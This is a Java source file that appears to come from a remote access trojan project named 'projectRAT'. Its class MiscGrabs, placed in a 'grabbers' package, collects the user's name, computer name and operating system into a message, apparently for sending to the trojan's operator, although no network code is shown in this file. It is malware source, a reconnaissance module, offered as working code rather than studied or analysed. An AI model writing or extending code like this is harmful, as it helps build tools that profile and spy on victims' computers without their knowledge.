package in.momin5.projectRAT.request.grabbers;

import in.momin5.projectRAT.request.Request;

import java.io.File;
import java.net.InetAddress;

public class MiscGrabs implements Request {

    String string;

    @Override
    public void init() throws Exception {
        String name = System.getProperty("user.name");
        String pcName = InetAddress.getLocalHost().getHostName();
        String osName = System.getProperty("os.name");


        string = String.format("USERNAME: %s \nPCNAME:   %s \nOS:       %s",name,pcName,osName);
    }

    @Override
    public String getMessage() {
        return string;
    }

    @Override
    public File[] getFiles() {
        return null;
    }

}
